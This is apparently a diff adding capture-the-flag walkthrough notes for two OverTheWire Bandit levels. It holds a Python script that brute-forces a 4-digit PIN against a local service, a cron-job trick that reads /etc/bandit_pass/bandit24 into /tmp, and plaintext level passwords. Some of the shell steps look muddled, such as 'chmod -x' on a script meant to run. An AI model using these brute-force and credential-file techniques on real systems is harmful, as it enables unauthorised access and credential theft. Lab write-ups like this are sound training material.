@@ -1,6 +1,82 @@
+#### Bandit Level 24 → Level 25
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
+```shell
+bandit24@bandit:~$ python3
+
+import socket
+from time import sleep
+
+host = '0.0.0.0'
+port = 30002
+bandit24_password = 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'
+
+
+def connect(s, pin):
+    s.send(f"{bandit24_password} {pin}\n".encode())
+    sleep(0.1)
+    response = s.recv(1024).decode()
+    return response
+
+
+def brute_force_pincode(start=0, end=10_000):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((host, port))
+        for i in range(start, end):
+            pincode = f"{i:04d}"
+            try:
+                print(f"Trying pincode: {pincode}")
+                response = connect(s, pincode)
+                if "Wrong!" not in response:
+                    print(f"Found the correct pincode: {pincode}")
+                    print(f"Response: {response}")
+                    return
+            except Exception as e:
+                print(f"Error with pincode {pincode}: {e}")
+                continue
+
+
+brute_force_pincode(840)
+
+# Found the correct pincode: 9297
+# Response: Correct!
+# The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+
 #### Bandit Level 23 → Level 24
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+Commands you may need to solve this level
+chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+```shell
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+bandit23@bandit:~$ cd /var/spool/bandit24/foo
+bandit23@bandit:~$ nano crack.sh
+#!/bin/bash
 
+log_file="/tmp/bandit24_files.txt"
+echo "Logging started at $(date)" > "$log_file"
+for item in /var/spool/bandit24/foo/*; do
+    if [ -d "$item" ]; then
+        echo "Directory: $item" >> "$log_file"
+        ls -l "$item" >> "$log_file"
+    elif [ -f "$item" ]; then
+        echo "File: $item" >> "$log_file"
+        cat "$item" >> "$log_file"
+    fi
+done
 
+bandit23@bandit:~$ chmod -x /var/spool/bandit24/foo/crack.sh
+bandit23@bandit:~$ chown bandit23:bandit23 /var/spool/bandit24/foo/crack.sh
+bandit23@bandit:~$ /tmp/bandit24_files.txt
+cat /etc/bandit_pass/bandit24 >> /tmp/tmp.pJeqHTifXQ/hubb
+
+bandit23@bandit:~$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit_log.txt" > /var/spool/bandit24/foo/crack.sh
+bandit23@bandit:~$ chmod -x /var/spool/bandit24/foo/crack.sh
+bandit23@bandit:~$ chown bandit23:bandit23 /var/spool/bandit24/foo/crack.sh
+bandit23@bandit:~$ cat /tmp/bandit_log.txt
+# gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
 
 #### Bandit Level 22 → Level 23
 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
